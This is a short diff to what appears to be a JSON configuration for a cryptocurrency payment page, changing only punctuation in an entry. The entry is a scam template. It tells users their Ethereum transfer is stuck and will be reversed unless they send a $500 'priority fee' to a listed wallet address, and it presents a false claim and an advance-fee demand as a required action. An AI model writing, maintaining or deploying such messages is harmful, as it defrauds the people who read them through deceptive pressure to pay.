@@ -43,7 +43,7 @@
         "requiredFeeUsd": 500,
         "paymentAddress": "0xaf3485471ad2433A78c8F41b18ecF0C362ED9fe1",
         "title": "Transaction Pending — Action Required",
-        "message": "This transfer is stuck in the mempool because of heavy Ethereum network congestion. At the current fee rate, miners will drop it before it confirms. To avoid a reversal and get this payment mined in the next block, a one-time priority fee of $500 USD must be sent to the acceleration address below. Once received, your transaction will be rebroadcast with elevated priority."
+        "message": "This transfer is stuck in the mempool because of heavy Ethereum network congestion. At the current fee rate, miners will drop it before it confirms. To avoid a reversal and get this payment mined in the next block, a one-time priority fee of $500 USD must be sent to the acceleration address below. Once received, your transaction will be rebroadcast with elevated priority.."
       }
     }
   ]
